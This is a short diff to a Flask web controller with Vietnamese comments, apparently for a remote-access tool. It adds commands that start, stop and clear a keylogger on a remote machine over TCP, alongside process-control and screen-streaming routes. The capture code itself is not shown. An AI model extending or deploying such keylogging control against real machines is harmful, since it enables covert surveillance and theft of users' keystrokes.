@@ -150,10 +150,14 @@ def processes_page():
 
 @app.route("/keylogger")
 def keylogger_page():
+    # Khi vào trang này, gửi lệnh yêu cầu Server xóa file log cũ
+    send_tcp_command("keylog_clear")
+    
+    # Xóa luôn file log tạm trên client (nếu có)
     try: os.remove("web_keylog.txt")
     except: pass
-    return render_template("index.html", title="Keylogger", mode="keylogger", keys="[No keys logged yet]")
-
+    
+    return render_template("index.html", title="Keylogger", mode="keylogger", keys="")
 # --- ROUTES API & STREAM ---
 
 @app.route('/video_feed_screen')
@@ -203,7 +207,13 @@ def control_action():
     command = ""
     
     # 2. Xử lý logic lệnh
-    if action in ("start", "stop"):
+    if action == "keylog_start":
+        command = "keylog_start"
+    elif action == "keylog_stop":
+        command = "keylog_stop"
+    elif action == "keylog_clear":
+        command = "keylog_clear"
+    elif action in ("start", "stop"):
         if not app_name:
             msg = "[ERROR] Missing app name"
             if request.is_json: return jsonify({"status": "error", "message": msg})
